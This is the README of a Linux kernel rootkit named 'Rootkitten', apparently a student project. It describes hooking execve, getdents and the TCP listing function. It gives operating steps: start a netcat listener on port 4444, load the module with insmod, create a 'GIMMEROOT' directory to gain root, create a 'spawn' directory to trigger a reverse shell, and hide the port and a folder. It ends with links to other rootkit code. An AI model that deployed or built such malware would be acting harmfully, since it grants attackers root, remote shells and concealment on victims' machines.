# SomethingAwesome-Rootkitten
This rootkit hooks three main functions.
Sys_call_table's execve syscall and getdents syscall
as well as the tcp4_seq_show function *(this is not a syscall)*

it is functional on kernel 4.15 i.e. ubuntu 18.06 and would not work on debian/other distros because
syscalltable is not exported by default, and would require a recompilation of the kernel for 
syscalltable to be available to be search for from kallsyms_get_name


## commands to run

to compile
make 

## preparation

have a netcat listener listening on port 4444

## inserting module

sudo insmod rootkitten.ko

## Getting root

mkdir GIMMEROOT

## spawning reverse shell

mkdir spawn


## checking for hidden tcp ports (4444 is hidden)

netstat -t

## folder that is hidden: src folder


### full list of reference code
https://github.com/SourceCodeDeleted/rootkitdev-linux

https://github.com/rootfoo/rootkit

https://github.com/f0rb1dd3n/Reptile

https://github.com/gg7/gentoo-kernel-guide

https://github.com/xcellerator/linux_kernel_hacking

